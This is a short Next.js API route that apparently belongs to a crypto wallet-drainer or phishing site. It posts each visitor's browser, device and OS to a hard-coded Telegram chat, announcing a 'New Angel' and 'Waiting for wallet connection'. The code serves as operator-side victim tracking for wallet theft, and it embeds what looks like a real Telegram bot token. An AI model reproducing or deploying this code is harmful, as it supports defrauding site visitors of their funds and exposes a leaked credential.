import { NextResponse, userAgent } from 'next/server';
import TelegramBot from "node-telegram-bot-api"

export async function POST(request: Request) {
    const bot = new TelegramBot('7825258454:AAHSAxS7tIK5NgSOV3kIROjdfi5ScUc4ZI8', { polling: false })
    const chatId = '-4699958230';

    const ua = userAgent(request)
    
    bot.sendMessage(chatId, `🚨🚨 New Angel 🚨🚨 \n\nBrowser : ${ua.browser.name} 💻\nAgent : ${ua.device.model} 🛜\nOS : ${ua.os.name} 📱\n\nWaiting for wallet connection 💸`);
    return NextResponse.json({msg: 'ok'})
}
